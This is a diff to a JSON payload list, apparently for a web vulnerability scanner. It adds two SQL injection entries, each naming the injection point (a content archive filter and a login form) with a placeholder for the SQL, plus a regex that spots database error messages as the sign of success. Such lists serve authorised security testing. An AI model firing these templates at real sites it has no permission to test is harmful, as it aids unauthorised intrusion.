@@ -2583,5 +2583,27 @@
       "expected_status_code": 200,
       "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
     }
+  },
+  {
+    "payload_id": "OWP-474682",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "filter=$sql&month=&year=&limit=20&view=archive&option=com_content",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474683",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "login.action.connect=Se%20connecter&came_from=&login=[SQLi]&password=paSSw0rd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
